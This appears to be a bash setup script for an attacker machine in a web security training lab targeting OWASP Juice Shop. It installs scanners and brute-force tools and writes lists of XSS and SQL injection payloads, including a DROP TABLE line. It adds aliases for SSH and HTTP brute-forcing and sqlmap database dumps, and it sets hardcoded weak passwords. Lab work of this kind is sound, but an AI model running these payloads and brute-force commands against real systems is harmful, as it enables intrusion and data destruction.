#!/bin/bash
# Script completo para instancia atacante
# Use: curl -fsSL URL | bash

set -e

LAB_NAME="${LAB_NAME:-cybersec-lab}"
TARGET_IP="${TARGET_IP:-172.16.2.185}"
LOG_FILE="/var/log/attacker-setup.log"
MAIN_USER="ubuntu"

log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a $LOG_FILE
}

log "=== CONFIGURANDO ARSENAL WEB SECURITY COMPLETO ==="

# Atualizar sistema
export DEBIAN_FRONTEND=noninteractive
apt-get update -y && apt-get upgrade -y

# Ferramentas base
apt-get install -y curl wget git vim ubuntu-desktop-minimal tightvncserver \
    firefox chromium-browser openjdk-11-jdk python3-pip build-essential \
    postgresql net-tools jq

# Scanning e enumeration
log "Instalando ferramentas de SCANNING..."
apt-get install -y nmap nikto whatweb gobuster dirb wfuzz ffuf

# Injection tools
log "Instalando ferramentas de INJECTION..."
apt-get install -y sqlmap

# Authentication/Authorization
log "Instalando ferramentas de AUTH..."
apt-get install -y hydra medusa john hashcat

# Python tools para web security
log "Instalando ferramentas Python especializadas..."
pip3 install requests beautifulsoup4 selenium jwt pyjwt python-jwt

# Configurar usuario
usermod -aG sudo $MAIN_USER
echo "$MAIN_USER:cybersec2024" | chpasswd

# Docker
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list
apt-get update -y && apt-get install -y docker-ce
systemctl enable docker && systemctl start docker
usermod -aG docker $MAIN_USER

# Burp Suite
cd /opt
wget -O burpsuite_community.jar "https://portswigger.net/burp/releases/download?product=community&type=jar"
chown $MAIN_USER:$MAIN_USER burpsuite_community.jar
cat > /usr/local/bin/burpsuite << 'BURPEOF'
#!/bin/bash
cd /opt
java -jar burpsuite_community.jar "$@"
BURPEOF
chmod +x /usr/local/bin/burpsuite

# OWASP ZAP
apt-get install -y zaproxy

# VNC Configuration
sudo -u $MAIN_USER bash << 'VNCEOF'
mkdir -p ~/.vnc
echo "vncpassword" | vncpasswd -f > ~/.vnc/passwd
chmod 600 ~/.vnc/passwd
cat > ~/.vnc/xstartup << 'XSTARTEOF'
#!/bin/bash
export XDG_CURRENT_DESKTOP="ubuntu:GNOME"
export XDG_SESSION_DESKTOP="ubuntu"
export XDG_SESSION_TYPE="x11"
exec gnome-session
XSTARTEOF
chmod +x ~/.vnc/xstartup
VNCEOF

sudo -u $MAIN_USER vncserver :1 -geometry 1440x900 -depth 24

# Wordlists e payloads
log "Configurando wordlists e payloads..."
mkdir -p /usr/share/wordlists/{passwords,xss,sqli,directories,usernames}

# Passwords comuns
cat > /usr/share/wordlists/passwords/common.txt << 'PASSEOF'
admin
password
123456
password123
admin123
root
test
guest
letmein
welcome
qwerty
abc123
changeme
demo
PASSEOF

# XSS Payloads
cat > /usr/share/wordlists/xss/basic.txt << 'XSSEOF'
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
javascript:alert('XSS')
<iframe src=javascript:alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<keygen onfocus=alert('XSS') autofocus>
<video><source onerror="alert('XSS')">
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
XSSEOF

# SQL Injection Payloads
cat > /usr/share/wordlists/sqli/basic.txt << 'SQLEOF'
'
"
' OR '1'='1
" OR "1"="1
' OR 1=1--
" OR 1=1--
' UNION SELECT NULL--
" UNION SELECT NULL--
'; DROP TABLE users;--
' AND 1=1--
' AND 1=2--
' ORDER BY 1--
' ORDER BY 100--
1' AND '1'='1
1" AND "1"="1
admin'--
admin"--
SQLEOF

# Diretorios comuns
cat > /usr/share/wordlists/directories/common.txt << 'DIREOF'
admin
administrator
login
wp-admin
phpmyadmin
api
rest
v1
v2
backup
config
test
dev
staging
uploads
images
css
js
includes
assets
DIREOF

# Usernames comuns
cat > /usr/share/wordlists/usernames/common.txt << 'USEREOF'
admin
administrator
root
test
guest
user
demo
api
service
operator
manager
support
help
info
contact
sales
marketing
USEREOF

chown -R $MAIN_USER:$MAIN_USER /usr/share/wordlists/

# Desktop shortcuts organizados
sudo -u $MAIN_USER mkdir -p /home/$MAIN_USER/Desktop/{WebAttacks,Scanning,Injection,Auth}

# Burp Suite
cat > /home/$MAIN_USER/Desktop/WebAttacks/BurpSuite.desktop << 'BURPDESKEOF'
[Desktop Entry]
Name=Burp Suite
Comment=Web Application Security Testing
Exec=burpsuite
Icon=applications-internet
Terminal=false
Type=Application
BURPDESKEOF

# OWASP ZAP
cat > /home/$MAIN_USER/Desktop/WebAttacks/OWASP-ZAP.desktop << 'ZAPDESKEOF'
[Desktop Entry]
Name=OWASP ZAP
Comment=Web Application Security Scanner
Exec=zaproxy
Icon=applications-internet
Terminal=false
Type=Application
ZAPDESKEOF

# Nikto
cat > /home/$MAIN_USER/Desktop/Scanning/Nikto.desktop << 'NIKTODESKEOF'
[Desktop Entry]
Name=Nikto Scanner
Exec=gnome-terminal -- bash -c 'echo "NIKTO WEB SCANNER"; echo "Uso: nikto -h URL"; bash'
Icon=applications-accessories
Terminal=false
Type=Application
NIKTODESKEOF

# Gobuster
cat > /home/$MAIN_USER/Desktop/Scanning/Gobuster.desktop << 'GOBUSTERDESKEOF'
[Desktop Entry]
Name=Gobuster
Exec=gnome-terminal -- bash -c 'echo "GOBUSTER DIRECTORY SCANNER"; echo "Uso: gobuster dir -u URL -w WORDLIST"; bash'
Icon=applications-accessories
Terminal=false
Type=Application
GOBUSTERDESKEOF

# SQLMap
cat > /home/$MAIN_USER/Desktop/Injection/SQLMap.desktop << 'SQLMAPDESKEOF'
[Desktop Entry]
Name=SQLMap
Exec=gnome-terminal -- bash -c 'echo "SQLMAP - SQL INJECTION TOOL"; echo "Uso: sqlmap -u URL --batch"; bash'
Icon=applications-accessories
Terminal=false
Type=Application
SQLMAPDESKEOF

# XSS Tools
cat > /home/$MAIN_USER/Desktop/Injection/XSS-Tools.desktop << 'XSSTOOLSDESKEOF'
[Desktop Entry]
Name=XSS Tools
Exec=gnome-terminal -- bash -c 'echo "XSS TESTING TOOLS"; echo "Payloads: /usr/share/wordlists/xss/basic.txt"; bash'
Icon=applications-accessories
Terminal=false
Type=Application
XSSTOOLSDESKEOF

# Hydra
cat > /home/$MAIN_USER/Desktop/Auth/Hydra.desktop << 'HYDRADESKEOF'
[Desktop Entry]
Name=Hydra
Exec=gnome-terminal -- bash -c 'echo "HYDRA BRUTE FORCE TOOL"; echo "HTTP: hydra -l USER -P PASSLIST target http-post-form"; bash'
Icon=applications-accessories
Terminal=false
Type=Application
HYDRADESKEOF

# Target
cat > /home/$MAIN_USER/Desktop/TARGET-JuiceShop.desktop << TARGETDESKEOF
[Desktop Entry]
Name=TARGET - Juice Shop
Comment=Aplicacao Alvo para Testes
Exec=firefox http://$TARGET_IP:3000
Icon=firefox
Terminal=false
Type=Application
TARGETDESKEOF

chmod +x /home/$MAIN_USER/Desktop/*/*.desktop /home/$MAIN_USER/Desktop/*.desktop
chown -R $MAIN_USER:$MAIN_USER /home/$MAIN_USER/Desktop/

# Aliases e funcoes completas
sudo -u $MAIN_USER bash << BASHRCEOF
cat >> /home/$MAIN_USER/.bashrc << 'ALIASESEOF'
export TARGET_IP="$TARGET_IP"
export TARGET_URL="http://$TARGET_IP:3000"

# Quick access
alias target="firefox \$TARGET_URL &"
alias burp="burpsuite &"
alias zap="zaproxy &"

# Scanning
alias quick-scan="nmap -sV -T4 --top-ports 1000"
alias web-scan="nikto -h"
alias dir-scan="gobuster dir -u \$TARGET_URL -w /usr/share/wordlists/directories/common.txt"

# Injection testing
alias sql-test="sqlmap -u \$TARGET_URL --batch --level=3"
alias sql-dump="sqlmap -u \$TARGET_URL --batch --dump"

# Authentication
alias brute-http="hydra -l admin -P /usr/share/wordlists/passwords/common.txt \$TARGET_IP http-post-form"
alias brute-ssh="hydra -l root -P /usr/share/wordlists/passwords/common.txt \$TARGET_IP ssh"

# Enumeration
alias enum-users="gobuster dir -u \$TARGET_URL -w /usr/share/wordlists/usernames/common.txt"
alias enum-dirs="dirb \$TARGET_URL /usr/share/wordlists/directories/common.txt"

# Analysis
alias check-headers="curl -I"
alias check-robots="curl \$TARGET_URL/robots.txt"

# Show tools
alias arsenal="echo 'WEB SECURITY TOOLS: sqlmap, burp, zap, hydra, gobuster, nikto, nmap'"

# Web attack function
web-attack() {
    local url=\${1:-\$TARGET_URL}
    echo "=== WEB ATTACK ON \$url ==="
    echo "1. Nmap scan..."
    nmap -sV \$(echo \$url | sed 's|http[s]*://||' | cut -d'/' -f1)
    echo "2. Nikto scan..."
    nikto -h \$url
    echo "3. Directory scan..."
    gobuster dir -u \$url -w /usr/share/wordlists/directories/common.txt
    echo "4. SQL injection test..."
    sqlmap -u "\$url" --batch --level=2
}

# JWT decode function
jwt-decode() {
    local token=\$1
    if [ -z "\$token" ]; then
        echo "Uso: jwt-decode 'JWT_TOKEN'"
        return 1
    fi
    python3 -c "
import jwt
import json
token = '\$token'
try:
    header = jwt.get_unverified_header(token)
    payload = jwt.decode(token, options={'verify_signature': False})
    print('Header:', json.dumps(header, indent=2))
    print('Payload:', json.dumps(payload, indent=2))
except Exception as e:
    print('Error:', e)
"
}
ALIASESEOF
BASHRCEOF

# Script de ataque web interativo
cat > /home/$MAIN_USER/Desktop/web_attack_suite.sh << ATTACKEOF
#!/bin/bash
echo "=== JUICE SHOP ATTACK SUITE ==="
echo "Target: $TARGET_IP:3000"
echo ""
echo "Choose attack type:"
echo "1) SQL Injection scan"
echo "2) XSS testing" 
echo "3) Authentication brute force"
echo "4) Directory enumeration"
echo "5) Full vulnerability scan"
echo ""
read -p "Select option (1-5): " choice

case \$choice in
    1) sqlmap -u "http://$TARGET_IP:3000/rest/user/login" --batch --level=3 ;;
    2) echo "Testing XSS..."; 
       curl "http://$TARGET_IP:3000/rest/products/search?q=<script>alert('XSS')</script>" ;;
    3) hydra -l admin -P /usr/share/wordlists/passwords/common.txt $TARGET_IP http-post-form ;;
    4) gobuster dir -u http://$TARGET_IP:3000 -w /usr/share/wordlists/directories/common.txt ;;
    5) nikto -h http://$TARGET_IP:3000 ;;
    *) echo "Invalid option" ;;
esac
ATTACKEOF

chmod +x /home/$MAIN_USER/Desktop/web_attack_suite.sh
chown -R $MAIN_USER:$MAIN_USER /home/$MAIN_USER/Desktop/

# Firewall
ufw --force enable
ufw allow ssh && ufw allow 5901/tcp && ufw allow from 172.16.2.0/24

# Status script
cat > /usr/local/bin/lab-status << 'STATUSEOF'
#!/bin/bash
echo "=== WEB SECURITY LAB STATUS ==="
netstat -tlnp | grep -q 5901 && echo "VNC: ACTIVE" || echo "VNC: INACTIVE"
ping -c 1 $TARGET_IP >/dev/null 2>&1 && echo "Target: REACHABLE" || echo "Target: UNREACHABLE"
curl -s http://$TARGET_IP:3000 >/dev/null && echo "Juice Shop: RUNNING" || echo "Juice Shop: DOWN"
echo ""
echo "=== INSTALLED TOOLS ==="
which sqlmap >/dev/null && echo "SQLMap: OK" || echo "SQLMap: FAIL"
which hydra >/dev/null && echo "Hydra: OK" || echo "Hydra: FAIL" 
which gobuster >/dev/null && echo "Gobuster: OK" || echo "Gobuster: FAIL"
which nikto >/dev/null && echo "Nikto: OK" || echo "Nikto: FAIL"
which burpsuite >/dev/null && echo "Burp Suite: OK" || echo "Burp Suite: FAIL"
STATUSEOF
chmod +x /usr/local/bin/lab-status

# Cleanup
apt-get autoremove -y && apt-get autoclean

log "=== WEB SECURITY ARSENAL CONFIGURADO ==="
log "VNC: IP_PUBLICO:5901 (password: vncpassword)"
log "Tools: sqlmap, burp, zap, hydra, gobuster, nikto"

netstat -tlnp | grep -q 5901 && log "VNC ATIVO" || log "VNC FALHOU"